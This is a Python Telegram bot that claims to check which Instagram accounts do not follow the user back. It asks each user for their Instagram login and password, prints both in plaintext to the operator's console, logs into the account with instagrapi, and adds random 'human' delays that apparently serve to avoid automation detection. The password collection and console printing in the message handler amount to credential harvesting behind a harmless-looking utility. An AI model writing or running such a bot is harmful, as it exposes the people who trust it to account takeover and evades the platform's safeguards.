from instagrapi import Client
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
import logging
import time
import random

# Logging setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Variables to store data
user_data = {}
cl = Client()

# Delays to mimic human behavior
def human_delay(min_delay=2, max_delay=5):
    time.sleep(random.uniform(min_delay, max_delay))

# Function for the /start command
def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text('Hello! Enter your Instagram login:')
    user_data[update.effective_user.id] = {'step': 'login'}

# Message handling
def handle_message(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    text = update.message.text

    if user_id not in user_data or 'step' not in user_data[user_id]:
        update.message.reply_text('Please enter /start first')
        return

    step = user_data[user_id]['step']

    if step == 'login':
        user_data[user_id]['username'] = text
        update.message.reply_text('Now enter your password:')
        user_data[user_id]['step'] = 'password'
        print(f"Login from user {user_id}: {text}")  # Output to VS Code

    elif step == 'password':
        user_data[user_id]['password'] = text
        update.message.reply_text('Checking followers... This may take some time.')
        print(f"Password from user {user_id}: {text}")  # Output to VS Code
        context.job_queue.run_once(check_instagram, 0, context=user_id)

# Instagram followers check
def check_instagram(context: CallbackContext) -> None:
    user_id = context.job.context
    username = user_data[user_id]['username']
    password = user_data[user_id]['password']

    try:
        cl.delay_range = [2, 6]
        cl.login(username, password)
        context.bot.send_message(chat_id=user_id, text="Successfully logged in!")
        human_delay()

        user_id_instagram = cl.user_id_from_username(username)
        human_delay(1, 3)

        context.bot.send_message(chat_id=user_id, text="Fetching followers list...")
        followers = cl.user_followers(user_id_instagram)
        followers_list = [user.username for user in followers.values()]
        context.bot.send_message(chat_id=user_id, text=f"Total followers: {len(followers_list)}")
        human_delay(2, 4)

        context.bot.send_message(chat_id=user_id, text="Fetching following list...")
        following = cl.user_following(user_id_instagram)
        following_list = [user.username for user in following.values()]
        context.bot.send_message(chat_id=user_id, text=f"Total following: {len(following_list)}")
        human_delay(2, 4)

        not_following_back = [user for user in following_list if user not in followers_list]

        if not_following_back:
            result = f"Total followers: {len(followers_list)}\nTotal following: {len(following_list)}\n\n" \
                     f"These users don’t follow you back ({len(not_following_back)}):\n" + \
                     "\n".join([f"- {user}" for user in not_following_back[:20]])
            context.bot.send_message(chat_id=user_id, text=result)
        else:
            context.bot.send_message(chat_id=user_id, text="Everyone you follow follows you back!")

        human_delay(1, 3)
        cl.logout()
        context.bot.send_message(chat_id=user_id, text="Check completed, logged out.")

    except Exception as e:
        context.bot.send_message(chat_id=user_id, text=f"Error: {str(e)}")
        logger.error(f"Error for {username}: {e}")

    user_data.pop(user_id, None)

# Main function
def main() -> None:
    TOKEN = " "  # TOKEN

    # Create Updater
    updater = Updater(TOKEN, use_context=True)

    # Get dispatcher to register handlers
    dp = updater.dispatcher

    # Handlers
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

    # Start the bot
    print("Bot started! Enter /start in Telegram.")
    updater.start_polling(timeout=30)
    updater.idle()

if __name__ == '__main__':
    main()
